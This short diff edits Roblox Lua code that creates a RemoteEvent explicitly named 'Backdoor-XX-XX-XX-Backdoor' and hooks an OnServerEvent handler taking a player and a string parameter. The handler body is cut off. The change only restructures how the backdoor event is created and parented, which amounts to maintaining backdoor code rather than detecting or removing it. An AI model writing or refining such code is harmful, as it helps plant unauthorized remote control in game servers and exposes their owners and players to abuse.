@@ -1,4 +1,5 @@
-local server = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
+local server = Instance.new("RemoteEvent")
+server.Parent = game:GetService("ReplicatedStorage")
 server.Name = "Backdoor-XX-XX-XX-Backdoor"
 
 server.OnServerEvent:Connect(function(player, ss)
